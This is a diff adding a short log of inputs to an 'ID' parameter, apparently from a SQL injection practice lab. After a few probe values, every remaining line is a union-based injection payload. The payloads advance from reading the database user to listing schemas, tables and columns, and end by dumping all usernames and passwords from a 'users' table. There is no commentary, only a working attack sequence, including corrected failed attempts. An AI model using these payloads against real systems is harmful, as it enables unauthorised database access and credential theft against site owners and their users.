@@ -1,0 +1,22 @@
+ID:1
+ID:1
+ID:1'
+ID:2
+ID:2
+ID:1
+ID:2
+ID:-2'union select 1,user(),3-- 
+ID:-2'union select 1,user(),3-- 
+ID:-2'union select 1,user(),3-- 
+ID:-2'union select 1,user(),3-- 
+ID:-2'union select 1,user(),3-- 
+ID:-2'union select 1,user(),3-- 
+ID:-2'union select 1,group_concat(schema_name) from information_schema.schemata,3-- 
+ID:-2'union select 1,(group_concat(schema_name) from information_schema.schemata),3-- 
+ID:-2'union select 1,(select group_concat(schema_name) from information_schema.schemata),3-- 
+ID:-2'union select 1,(select group_concat(schema_name) from information_schema.schemata),3-- 
+ID:-2'union select 1,(select group_concat(table_name) from information_schema.tables where schema_name = 'security'),3-- 
+ID:-2'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema = 'security'),3-- 
+ID:-2'union select 1,(select group_concat(column_name) from information_schema.columns where table_name = 'users'),3-- 
+ID:-2'union select 1,(select group_concat(username) from users),3-- 
+ID:-2'union select 1,(select group_concat(password) from users),3-- 
